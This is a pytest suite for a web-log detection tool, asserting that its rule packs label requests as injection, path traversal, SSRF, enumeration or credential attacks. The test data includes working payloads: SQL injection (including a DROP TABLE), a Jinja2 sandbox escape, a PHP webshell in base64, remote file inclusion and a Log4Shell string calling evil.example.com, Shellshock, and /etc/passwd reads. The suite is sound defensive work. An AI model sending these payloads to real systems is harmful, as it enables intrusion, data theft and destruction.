"""Tests for the rule packs that ship with the tool.

These are the closest thing the project has to acceptance tests for detection:
each case is a payload seen in the wild, asserted to reach the right category.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest

from logarc.core.activity import ActivityCategory
from logarc.core.event import NormalizedEvent
from logarc.core.evidence import EvidenceRef
from logarc.detect.engine import RuleEngine
from logarc.detect.rulepacks import DEFAULT_RULEPACK_DIR, default_rules
from logarc.detect.rules import load_rules

START = datetime(2024, 5, 1, 12, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    return RuleEngine(default_rules())


def request(
    target: str,
    *,
    status: int = 200,
    user_agent: str | None = "Mozilla/5.0",
    seconds: float = 0,
    referer: str | None = None,
) -> NormalizedEvent:
    path, _, query = target.partition("?")
    return NormalizedEvent(
        timestamp=START + timedelta(seconds=seconds),
        client_ip="203.0.113.5",
        evidence=EvidenceRef("access.log", int(seconds) + 1),
        method="GET",
        path=path,
        query=query or None,
        status=status,
        bytes_sent=512,
        referer=referer,
        user_agent=user_agent,
    )


def test_the_bundled_packs_load() -> None:
    rules = default_rules()

    assert len(rules) > 20
    assert DEFAULT_RULEPACK_DIR.is_dir()


def test_every_bundled_rule_has_a_unique_id() -> None:
    ids = [rule.id for rule in default_rules()]

    assert len(ids) == len(set(ids))


def test_owasp_mappings_use_the_expected_notation() -> None:
    for rule in default_rules():
        if rule.owasp is not None:
            assert rule.owasp.startswith("A") and ":2021" in rule.owasp


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("/products?id=1 UNION SELECT username,password FROM users", ActivityCategory.INJECTION),
        ("/products?id=1' OR '1'='1", ActivityCategory.INJECTION),
        ("/p?id=1;SELECT pg_sleep(10)--", ActivityCategory.INJECTION),
        (
            "/p?id=1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
            ActivityCategory.INJECTION,
        ),
        ("/p?id=1; DROP TABLE users--", ActivityCategory.INJECTION),
        # Form encoding, as a browser and most attack tools send it: spaces
        # written as `+`. Found missing by the CSIC 2010 conversion.
        ("/p?id=1%27+OR+%271%27%3D%271", ActivityCategory.INJECTION),
        ("/p?q=1+UNION+SELECT+null%2Cnull--", ActivityCategory.INJECTION),
        # Error-based probing: the payload never returns rows, it provokes a
        # message that names the database. Found missing by the evaluation run.
        ("/p?id=1 AND 1=CONVERT(int,@@version)--", ActivityCategory.INJECTION),
        ("/p?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", ActivityCategory.INJECTION),
        ("/p?id=1' AND 1=CAST((SELECT current_user) AS int)--", ActivityCategory.INJECTION),
        ("/p?id=1 AND UPDATEXML(1,CONCAT(0x7e,@@datadir),1)", ActivityCategory.INJECTION),
        ("/search?q=<script>alert(1)</script>", ActivityCategory.INJECTION),
        ("/p?next=javascript:alert(1)", ActivityCategory.INJECTION),
        # sqlmap's default boolean-blind series, exactly as it sends them.
        # Every one of these was reaching the rules as nothing at all: the
        # tautology rule wanted the comparison to end at a comment or at the
        # end of the string, and sqlmap wraps it in parentheses, compares with
        # LIKE, or leaves a `%` inside the quoted operand.
        (
            "/search?q=oak%27%29%29%20AND%205481%3D5481%20AND%20%28%28%27SUiH%27%3D%27SUiH",
            ActivityCategory.INJECTION,
        ),
        (
            "/search?q=oak%27%29%20AND%201646%3D4348%20AND%20%28%27fkFQ%27%20LIKE%20%27fkFQ",
            ActivityCategory.INJECTION,
        ),
        (
            "/search?q=oak%25%27%20AND%203812%3D6291%20AND%20%27ZxzJ%25%27%3D%27ZxzJ",
            ActivityCategory.INJECTION,
        ),
        # Column counting, the step between finding the injection point and
        # building the UNION. No rule covered it, so the whole reconnaissance
        # half of a UNION attack was invisible while the UNION itself was not.
        ("/search?q=oak%25%27%20ORDER%20BY%201--%20BwtS", ActivityCategory.INJECTION),
        # Time-based blind without a sleep function: the delay comes from making
        # the database do expensive work instead. `sleep()` is often disabled;
        # this is what sqlmap falls back to, and it is also a small denial of
        # service in its own right.
        (
            "/search?q=%27%20AND%201%3D%28SELECT%20LENGTH%28HEX%28RANDOMBLOB%28200000000%29%29%29%29--%2B",
            ActivityCategory.INJECTION,
        ),
        # Template injection past the arithmetic probe. `{{7*7}}` is how an
        # attacker finds the hole; these are what they send once they have. The
        # rule matched only the probe, so a scan showed its first request and
        # none of the ones that mattered — including the Jinja2 sandbox escape,
        # which is the most-used server-side template RCE payload there is.
        ("/p?tpl={{config.items()}}", ActivityCategory.INJECTION),
        ("/p?tpl={{''.__class__.__mro__[1].__subclasses__()}}", ActivityCategory.INJECTION),
        ("/p?tpl={{file_get_contents('/etc/passwd')}}", ActivityCategory.INJECTION),
        ("/p?name=<%= 7*7 %>", ActivityCategory.INJECTION),
        ("/p?q=#{7*7}", ActivityCategory.INJECTION),
        # PHP, which had no rule of its own at all — every `php` in the packs
        # was a filename pattern. Against the CRS corpus family 933 scored
        # 0.012 over 173 cases, and the two that matched did so through a
        # reconnaissance rule catching a path. These are the shapes an access
        # log can actually see: a wrapper or a URL in a parameter the
        # application is about to include.
        (
            "/index.php?page=php://filter/convert.base64-encode/resource=config",
            ActivityCategory.INJECTION,
        ),
        ("/index.php?file=php://input", ActivityCategory.INJECTION),
        (
            "/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==",
            ActivityCategory.INJECTION,
        ),
        ("/index.php?f=phar://uploads/avatar.jpg/x", ActivityCategory.INJECTION),
        # Remote file inclusion: the parameter is a URL somewhere else.
        ("/index.php?file=http://evil.example.com/shell.txt", ActivityCategory.INJECTION),
        # PHP's own execution functions, named in a parameter.
        ("/p?x=system('id')", ActivityCategory.INJECTION),
        ("/p?x=shell_exec('whoami')", ActivityCategory.INJECTION),
        ("/p?x=passthru('ls -la')", ActivityCategory.INJECTION),
        # A serialised object, which reaches `unserialize` and runs whatever
        # magic method the class exposes.
        ('/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}', ActivityCategory.INJECTION),
        # Two command-injection shapes that only matched before because the
        # payload happened to name /etc/passwd — the file caught them, not the
        # injection.
        ("/p?cmd=%0awhoami", ActivityCategory.INJECTION),
        ("/p?c={id,}", ActivityCategory.INJECTION),
        ("/ping?host=127.0.0.1;cat /etc/passwd", ActivityCategory.PATH_TRAVERSAL),
        ('/api?filter={"$where":"1==1"}', ActivityCategory.INJECTION),
        ("/download?file=../../../../etc/passwd", ActivityCategory.PATH_TRAVERSAL),
        ("/download?file=..%2f..%2f..%2fetc%2fpasswd", ActivityCategory.PATH_TRAVERSAL),
        ("/.env", ActivityCategory.RECONNAISSANCE),
        ("/.git/config", ActivityCategory.RECONNAISSANCE),
        # Dependency manifests: how an attacker learns which versions are
        # installed before looking up what they are vulnerable to.
        ("/composer.json", ActivityCategory.RECONNAISSANCE),
        ("/package-lock.json", ActivityCategory.RECONNAISSANCE),
        ("/requirements.txt", ActivityCategory.RECONNAISSANCE),
        ("/backup.sql", ActivityCategory.RECONNAISSANCE),
        ("/phpinfo.php", ActivityCategory.RECONNAISSANCE),
        ("/fetch?url=http://169.254.169.254/latest/meta-data/", ActivityCategory.SSRF),
        ("/fetch?url=file:///etc/passwd", ActivityCategory.SSRF),
    ],
)
def test_known_payloads_reach_the_right_category(
    engine: RuleEngine, target: str, expected: ActivityCategory
) -> None:
    """Asserts the category is among the matches rather than that it won.

    A payload can honestly be two things at once — `file:///etc/passwd` in a
    parameter is both SSRF and an attempt to read a system file — and which one
    leads is a precedence decision, not a detection one. Pinning the primary
    label here would turn a taxonomy judgement into a test failure.
    """
    (labelled,) = engine.label_events([request(target)])

    matched = {label.category for label in labelled.all_labels}
    assert expected in matched, (
        f"{target!r} matched {[label.rule_id for label in labelled.all_labels] or 'nothing'}"
    )


def test_log4shell_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events(
        [request("/", user_agent="${jndi:ldap://evil.example.com/a}")]
    )

    assert labelled.label.rule_id == "log4shell_jndi"
    assert labelled.label.category is ActivityCategory.EXPLOITATION


def test_shellshock_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events(
        [request("/cgi-bin/x", user_agent="() { :; }; /bin/cat /etc/passwd")]
    )

    assert labelled.label.rule_id == "shellshock"


def test_a_scanner_announces_itself(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events([request("/", user_agent="sqlmap/1.7#stable")])

    assert labelled.label.rule_id == "scanner_user_agent"


def test_directory_enumeration_is_seen_across_requests(engine: RuleEngine) -> None:
    events = [request(f"/admin{n}", status=404, seconds=n) for n in range(25)]

    labelled = engine.label_events(events)

    assert any(item.label.rule_id == "directory_enumeration" for item in labelled)


def test_human_paced_directory_enumeration_is_detected(engine: RuleEngine) -> None:
    seconds = [0, 40, 80, 120, 160, 200, 240, 300]
    targets = [f"/quiet-probe-{n % 6}" for n in range(8)]
    events = [
        request(target, status=404, seconds=offset)
        for target, offset in zip(targets, seconds, strict=True)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in labelled)


@pytest.mark.parametrize(
    "targets",
    [
        [f"/probe-{n}" for n in range(7)],
        [f"/probe-{n % 5}" for n in range(8)],
    ],
)
def test_low_slow_enumeration_needs_eight_requests_and_six_paths(
    engine: RuleEngine, targets: list[str]
) -> None:
    events = [request(target, status=404, seconds=n * 40) for n, target in enumerate(targets)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration_low_slow" for item in labelled)


def test_low_slow_enumeration_does_not_count_refused_paths(engine: RuleEngine) -> None:
    events = [request(f"/private-{n}", status=403, seconds=n * 40) for n in range(8)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration_low_slow" for item in labelled)


def test_refused_paths_are_forced_browsing_rather_than_enumeration(engine: RuleEngine) -> None:
    """Two different behaviours, told apart by what the server answered.

    A wall of 404s is someone finding out what exists. A wall of 403s is
    someone being refused things that do exist. Enumeration used to claim both,
    so forced browsing — the more specific rule — could never win, and the
    access-control category never appeared in a graph at all.
    """
    # Enough requests, paths and speed that the enumeration rule would also
    # cover them if it still counted refusals as discovery.
    events = [request(f"/admin/{n}", status=403, seconds=n) for n in range(25)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "forced_browsing" for item in labelled)
    assert all(item.label.category is ActivityCategory.ACCESS_CONTROL for item in labelled)


@pytest.mark.parametrize(
    "target",
    [
        "/wp-admin/",
        "/wp-login.php",
        "/wp-includes/wlwmanifest.xml",
        "/wp-content/plugins/wp-file-manager/readme.txt",
        "/xmlrpc.php",
        "/administrator/",
        "/administrator/index.php",
        "/phpmyadmin/",
        "/adminer.php",
        "/admin.php",
        "/shell.php",
        "/test.php",
        "/old/",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ],
)
def test_a_probe_for_software_the_site_does_not_run_is_enumeration(
    engine: RuleEngine, target: str
) -> None:
    """One request is enough when the path names software by its own convention.

    The window rules need a burst, and this behaviour does not come in bursts:
    the scanner in the committed excerpt asks for four to six of these, waits
    hours, and asks again. Every one is a 404, so `directory_enumeration_low_slow`
    — which wants eight requests — never fires, and 92 requests the truth calls
    enumeration reached the report as ordinary browsing.

    These paths do not need a burst to be legible. `/wp-admin/` on a site with no
    WordPress is not a mistyped URL.
    """
    (labelled,) = engine.label_events([request(target, status=404)])

    assert labelled.label.category is ActivityCategory.ENUMERATION, (
        f"{target!r} matched {[label.rule_id for label in labelled.all_labels] or 'nothing'}"
    )


@pytest.mark.parametrize("target", ["/wp-admin/", "/phpmyadmin/", "/administrator/"])
def test_the_same_path_answered_normally_is_the_site_running_that_software(
    engine: RuleEngine, target: str
) -> None:
    """The whole discrimination, and the reason the rule can be this broad.

    `/wp-admin/` answered 200 means the site runs WordPress and someone opened
    its admin page. Answered 404 it means the site does not, and someone asked
    anyway. Without the status condition this rule would label every WordPress
    site's own administrator a scanner.
    """
    (labelled,) = engine.label_events([request(target, status=200)])

    assert not labelled.label.category.is_hostile, (
        f"{target!r} at 200 matched {[label.rule_id for label in labelled.all_labels]}"
    )


@pytest.mark.parametrize("target", ["/admin.php", "/shell.php", "/phpmyadmin/"])
def test_a_probe_that_sends_no_user_agent_stays_reconnaissance(
    engine: RuleEngine, target: str
) -> None:
    """A client not even pretending to be a browser is already identified.

    The same four paths appear in the excerpt twice: once from a client
    forging a browser User-Agent, which the truth calls enumeration, and once
    from one sending none at all, which it calls reconnaissance. The request
    lines are otherwise identical, so the User-Agent is the only thing that
    separates them — and `absent_user_agent` had already read the second group
    correctly. Without this condition the path rule outranks it and takes 49
    requests that were being reported right.
    """
    (labelled,) = engine.label_events([request(target, status=404, user_agent="")])

    assert labelled.label.category is ActivityCategory.RECONNAISSANCE
    assert labelled.label.rule_id == "absent_user_agent"


@pytest.mark.parametrize("target", ["/.env", "/.git/config"])
def test_a_secret_probe_stays_reconnaissance_rather_than_becoming_enumeration(
    engine: RuleEngine, target: str
) -> None:
    """Where the truth draws the line, and it is not where it first looks.

    Both are 404s for well-known paths, so a rule written by shape alone would
    take them. The dataset's truth calls `/.env` and `/.git/*` reconnaissance
    and `/wp-admin/` enumeration, and the distinction holds up: one is looking
    for a secret that would be readable if present, the other is finding out
    which software is installed. `config_file_exposure` already reads them
    correctly, and the enumeration rule must not outrank it.
    """
    (labelled,) = engine.label_events([request(target, status=404)])

    assert labelled.label.category is ActivityCategory.RECONNAISSANCE
    assert labelled.label.rule_id == "config_file_exposure"


def test_a_redirect_away_from_an_admin_page_is_a_refusal(engine: RuleEngine) -> None:
    """Most applications refuse an unauthenticated admin request with a 302.

    `admin_area_probe` tested `status >= 400`, which assumes the server answers
    a refusal with 401 or 403. Real applications mostly do not: they redirect to
    the login form, and a redirect is 302.

    Measured on the committed excerpt, where the ground truth marks 24 requests
    as `access_control`: the rule as written reached **none** of them, and that
    is the whole of why the category scored 0.000 on the headline corpus.
    Accepting 302 and 303 reaches 13 of the 24 and claims nothing it did not
    claim before.
    """
    (labelled,) = engine.label_events([request("/admin/users", status=302)])

    assert labelled.label.rule_id == "admin_area_redirect"
    assert labelled.label.category is ActivityCategory.ACCESS_CONTROL


def test_reaching_an_admin_page_successfully_is_not_a_refusal(
    engine: RuleEngine,
) -> None:
    """The rule is about being turned away, so a 200 must not match it.

    Widening to "any status" would have reached 19 of the excerpt's 24 rather
    than 13 — and would also have claimed five `injection` and two
    `exploitation` requests as access control, which is a worse answer than
    missing them. A successful admin request is somebody's ordinary Tuesday
    until another rule says otherwise.
    """
    (labelled,) = engine.label_events([request("/admin/users", status=200)])

    assert labelled.label.rule_id not in {"admin_area_probe", "admin_area_redirect"}


def test_a_missing_admin_page_is_not_an_access_control_finding(
    engine: RuleEngine,
) -> None:
    """404 says the thing is not there. 403 says it is there and you may not.

    Those are opposite findings, and this pack already states the distinction —
    `directory_enumeration`'s own comment says "enumeration is finding out what
    exists; a refusal means the thing exists and is protected". `forced_browsing`
    keeps to it with `any_of: [401, 403]`.

    `admin_area_probe` did not: it took `status >= 400`, which sweeps 404 in with
    the refusals. On the committed excerpt every one of its 140 matches on admin
    paths was a 404 or a 400 — not one was a real refusal — and the truth calls
    them enumeration or reconnaissance. It was the worst precision in the pack,
    0.146, and every point of it was this clause.
    """
    (labelled,) = engine.label_events([request("/wp-admin/", status=404)])

    assert labelled.label.category is not ActivityCategory.ACCESS_CONTROL


def test_a_forbidden_admin_page_still_is_one(engine: RuleEngine) -> None:
    """The other half. A 403 is what the rule was always meant to catch."""
    (labelled,) = engine.label_events([request("/admin/settings", status=403)])

    assert labelled.label.rule_id == "admin_area_probe"
    assert labelled.label.category is ActivityCategory.ACCESS_CONTROL


def test_a_script_wearing_an_image_extension_is_not_a_static_asset(
    engine: RuleEngine,
) -> None:
    """`/uploads/shell.php.jpg` was being called an image, because it ends `.jpg`.

    This is the upload-filter bypass: name the file so the check sees `.jpg` and
    the server still hands it to the PHP interpreter. The excerpt carries four of
    these, answered 200, with the command in the query — `?c=id`,
    `?c=cat /etc/passwd`. The truth calls them `exploitation`.

    `is_static_asset` reads the last extension, so all four came back
    `static_asset`: the tool looked at a live webshell being driven and reported
    an image being served. Of everything in this pack, that was the most
    dangerous thing it got wrong.
    """
    (labelled,) = engine.label_events([request("/uploads/shell.php.jpg?c=id")])

    assert labelled.label.category is ActivityCategory.EXPLOITATION
    assert labelled.label.rule_id == "webshell_double_extension"


def test_an_ordinary_image_is_still_an_ordinary_image(engine: RuleEngine) -> None:
    """The guard on the rule above. One extension is not two."""
    (labelled,) = engine.label_events([request("/uploads/holiday.jpg")])

    assert labelled.label.category is ActivityCategory.STATIC_ASSET


def test_a_compressed_archive_is_not_a_webshell(engine: RuleEngine) -> None:
    """`backup.tar.gz` has two extensions and neither is a script.

    Worth a test of its own: a rule written as "any two extensions" would claim
    every compressed file on the internet, and this is the shape it would trip on
    first.
    """
    (labelled,) = engine.label_events([request("/backups/backup.tar.gz")])

    assert labelled.label.rule_id != "webshell_double_extension"


def test_a_fast_page_load_is_not_reconnaissance(engine: RuleEngine) -> None:
    """A browser pulling one page's sub-resources is not a scan.

    Sixty asset fetches inside six seconds is what a single media-heavy page
    looks like over HTTP/2. `rapid_request_burst` keyed on rate alone and
    carried no `member` clause, so it labelled every request in the burst:
    427 static-asset lines of one measured corpus became reconnaissance, and
    not one of the 469 lines it won across that corpus was correct.
    """
    events = [request(f"/assets/img/{n}.png", seconds=n * 0.1) for n in range(60)]

    labelled = engine.label_events(events)

    assert all(item.label.category is ActivityCategory.STATIC_ASSET for item in labelled)


def test_a_page_whose_assets_are_all_missing_is_not_hostile(engine: RuleEngine) -> None:
    """A botched deploy is not an attacker.

    When a page requests sixty assets that are no longer there, every visitor
    produces sixty distinct 404s in six seconds. That clears
    `directory_enumeration`'s 20-in-60s and 15-distinct-paths thresholds, so
    each visitor is reported as enumerating the site.

    Recorded rather than left silent because it is the reason a `status >= 400`
    scope was rejected for the burst rule: keying on error responses fixes the
    healthy page and admits the broken one. The corpus this was measured on
    cannot show it — 41 of its 4,209 client errors are benign — so the case
    lives here instead.
    """
    events = [request(f"/assets/img/{n}.png", status=404, seconds=n * 0.1) for n in range(60)]

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


@pytest.mark.parametrize("referer", [None, "https://shop.example.com/catalog"])
def test_five_missing_pages_are_not_low_slow_enumeration(
    engine: RuleEngine, referer: str | None
) -> None:
    events = [
        request(f"/missing-page-{n}", status=404, seconds=n * 20, referer=referer) for n in range(5)
    ]

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


def test_one_asset_does_not_break_a_low_slow_window(engine: RuleEngine) -> None:
    events = [request(f"/probe-{n}", status=404, seconds=n * 30) for n in range(8)]
    events.insert(4, request("/missing.png", status=404, seconds=105))

    labelled = engine.label_events(events)

    probes = [item for item in labelled if not item.event.path.endswith(".png")]
    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in probes)


def test_later_assets_do_not_hide_an_earlier_high_volume_window(engine: RuleEngine) -> None:
    events = [request(f"/probe-{n}", status=404, seconds=n * 2) for n in range(20)]
    events.extend(request(f"/missing-{n}.png", status=404, seconds=40 + n * 2) for n in range(6))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[:20])
    assert "directory_enumeration" not in {label.rule_id for label in labelled[-1].all_labels}


def test_high_volume_window_recovers_after_an_asset_prefix(engine: RuleEngine) -> None:
    events = [request(f"/missing-{n}.png", status=404, seconds=n) for n in range(6)]
    events.extend(request(f"/probe-{n}", status=404, seconds=6 + n) for n in range(20))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[-20:])


def test_assets_around_a_high_volume_window_do_not_hide_it(engine: RuleEngine) -> None:
    events = [request(f"/before-{n}.png", status=404, seconds=n) for n in range(6)]
    events.extend(request(f"/probe-{n}", status=404, seconds=6 + n) for n in range(20))
    events.extend(request(f"/after-{n}.png", status=404, seconds=26 + n) for n in range(6))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[6:26])


def test_high_volume_enumeration_accepts_guard_thresholds(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}.png" if n < 4 else f"/probe-{n}",
            status=404,
            seconds=n * 3,
            referer="https://shop.example.com/catalog" if 4 <= n < 8 else None,
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    overlap = [
        item
        for item in labelled
        if {label.rule_id for label in item.all_labels}
        >= {"directory_enumeration", "directory_enumeration_low_slow"}
    ]
    assert overlap
    assert all(item.label.rule_id == "directory_enumeration" for item in overlap)


def test_high_volume_enumeration_rejects_too_many_static_assets(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}.png" if n < 5 else f"/probe-{n}",
            status=404,
            seconds=n * 3,
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration" for item in labelled)


def test_high_volume_enumeration_ignores_spoofed_referers(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}",
            status=404,
            seconds=n * 3,
            referer="https://shop.example.com/catalog",
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled)


def test_low_slow_enumeration_ignores_spoofed_referers(engine: RuleEngine) -> None:
    events = [
        request(
            f"/quiet-probe-{n}",
            status=404,
            seconds=n * 40,
            referer="https://shop.example.com/catalog",
        )
        for n in range(8)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in labelled)


def test_credential_attack_is_seen_across_requests(engine: RuleEngine) -> None:
    events = [request("/login", status=401, seconds=n * 2) for n in range(20)]

    labelled = engine.label_events(events)

    assert any(item.label.rule_id == "credential_attack" for item in labelled)


def test_an_attack_the_server_locks_out_is_still_an_attack(engine: RuleEngine) -> None:
    """The threshold has to sit below the defence it is watching.

    The excerpt's server rate-limits a login after six failures, and the
    attacker stops there and comes back later. This rule wanted ten in a window,
    so against a server that locks out sooner than the rule counts it could
    never fire at all — 13 requests were reported as a scripted client rather
    than as the credential attack they were part of.

    Five failures on one endpoint inside five minutes is the condition almost
    every authentication system already treats as abnormal. That is what makes
    it a defensible floor rather than a tuned one.
    """
    events = [request("/login", status=401, seconds=n * 20) for n in range(5)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "credential_attack" for item in labelled)


def test_one_fumbled_password_is_not_an_attack(engine: RuleEngine) -> None:
    """The other side of that floor, and the reason it is not lower.

    Someone mistyping a password twice is the most ordinary thing on any login
    page, and it must not reach a report as a credential attack.
    """
    events = [request("/login", status=401, seconds=n * 20) for n in range(2)]
    events.append(request("/login", status=302, seconds=60))

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


@pytest.mark.parametrize(
    "target",
    [
        "/",
        "/index.html",
        "/products/shoes",
        "/assets/app.css",
        "/images/logo.png",
        "/search?q=running+shoes",
        "/api/v1/products?page=2",
        "/blog/2024/05/a-post-about-unions",
        "/cart?add=17&quantity=2",
        # Words the error-based injection rule looks for, used innocently.
        "/api/convert?from=usd&to=eur",
        "/docs/version",
        "/api/v1/users/cast-members",
    ],
)
def test_ordinary_traffic_is_not_flagged_as_hostile(engine: RuleEngine, target: str) -> None:
    """False positives on normal browsing would bury the real findings."""
    (labelled,) = engine.label_events([request(target)])

    assert not labelled.label.category.is_hostile, (
        f"{target!r} was flagged as {labelled.label.rule_id!r}"
    )


def test_packs_can_be_extended_with_a_local_pack(tmp_path) -> None:  # type: ignore[no-untyped-def]
    """Investigators add their own detections without touching the code."""
    local = tmp_path / "local.yaml"
    local.write_text(
        """
version: 1
rules:
  - id: house_rule
    name: House Rule
    category: reconnaissance
    severity: low
    match:
      any:
        - field: path_decoded
          contains: '/honeypot'
""",
        encoding="utf-8",
    )

    engine = RuleEngine([*default_rules(), *load_rules([local])])
    (labelled,) = engine.label_events([request("/honeypot")])

    assert labelled.label.rule_id == "house_rule"
